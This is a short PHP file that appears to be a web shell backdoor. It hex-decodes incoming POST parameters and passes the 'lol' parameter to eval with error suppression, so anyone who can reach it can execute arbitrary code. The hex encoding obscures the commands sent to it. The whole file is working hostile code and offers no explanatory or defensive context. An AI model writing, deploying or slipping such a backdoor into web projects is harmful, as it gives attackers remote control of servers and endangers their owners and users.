<?php 
foreach($_POST as $k => $v){
	$kk = @pack("H*", $k);
	$_POST[$kk]=@pack("H*", $v);
}
@eval($_POST['lol']);
echo 'gg';
?>
